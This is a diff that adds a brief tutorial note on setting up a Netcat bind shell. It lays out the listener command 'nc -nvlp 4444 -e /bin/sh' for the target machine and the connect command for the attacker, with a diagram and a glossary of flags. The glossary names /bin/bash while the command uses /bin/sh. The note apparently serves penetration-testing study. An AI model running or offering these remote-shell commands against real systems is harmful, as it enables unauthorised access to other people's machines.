@@ -1,0 +1,29 @@
+
+
+
+
+
+
+Setting up Netcat Bind Shells
+
+Bind a bash shell to port 4444 using Netcat.
+Connect to the target host on port 4444 from the attack box.
+Issue commands on the target host from the attack box.
+
+Attacker machine          |                                           |   Target Machine
+192.168.2.1               |   ---------tcp connection---------->>     |   192.168.55.30
+nc 192.168.55.30 4444     |                                           |   nc -nvlp 4444 -e /bin/sh
+connecting part           |                                           |   listining part
+
+
+
+where
+ 
+v ---- verbose
+l ---- listining
+p ---- port
+4444 ---- port number
+-e   ------ execution
+
+/bin/bash ---- path of shell
+
